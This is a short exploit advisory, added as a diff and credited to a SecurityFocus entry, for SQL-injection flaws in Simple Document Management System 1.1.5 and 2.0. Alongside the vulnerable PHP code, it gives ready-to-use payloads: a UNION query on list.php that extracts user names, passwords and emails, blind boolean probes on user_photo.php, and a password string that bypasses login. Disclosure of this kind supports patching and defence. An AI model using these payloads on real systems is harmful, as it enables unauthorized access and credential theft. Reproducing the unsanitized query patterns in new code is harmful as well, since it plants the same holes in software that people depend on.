@@ -1,0 +1,73 @@
+source: http://www.securityfocus.com/bid/54043/info
+
+Simple Document Management System is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in an SQL query.
+
+A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.
+
+Simple Document Management System versions 1.1.5 and 2.0 are vulnerable. 
+
+-----------
+version 2.0
+-----------
+
+/list.php?folder_id=['foo]
+/detail.php?doc_id=['foo]
+
+<code>
+line 13: if(isset($_GET['folder_id'])) $folder_id = $_GET['folder_id'];
+         ...
+line 48: if(isset($order)) {
+         $query = "SELECT id,name FROM folders WHERE parent=$folder_id ORDER BY ". rawurldecode($order);
+         } else {
+         $query = "SELECT id,name FROM folders WHERE parent=$folder_id";
+         }
+</code>
+
+.xpl! :: /list.php?folder_id=-10+union+all+select+1,1,1,concat_ws(char(58),user,pass,name,email),1,1,1,1,1,1,0+from+users--
+
+
+~~ [Blind]
+
+/user_photo.php?view=[foo]
+
+<code>
+$query = "SELECT photo,mime FROM users_info WHERE id=".$_GET['view'];
+  $res = mysql_query($query, $sql);
+  if( mysql_num_rows($res) == 1 ) {
+    $row = mysql_fetch_array($res);
+    header( "Content-type: $row[mime]" );
+    echo "". base64_decode($row[photo]) ."";
+  } else {
+    echo "Badness!\n";
+  }
+</code>
+
+.poc! :: /user_photo.php?view=2+and+1=1
+         /user_photo.php?view=2+and+1=2
+
+
+-------------
+version 1.1.5
+-------------
+
+/login.php
+
+<code>
+  $result = @mysql_query("SELECT pass != PASSWORD('$pass') FROM users WHERE user='$login'");
+  $row = @mysql_fetch_array($result);
+  if( $row[0] != 0 ) {
+      header("Location: index.php");
+      exit;
+  }
+
+  $result = @mysql_query("SELECT id,name FROM users WHERE user='$login'");
+  $row = @mysql_fetch_array($result);
+  $id = $row[id];
+  $name = $row[name];
+</code>
+
+.xpl! :: user: Admin
+         password: ') FROM users WHERE id=-1 UNION SELECT 0 FROM users --
+
+
+ __h0__
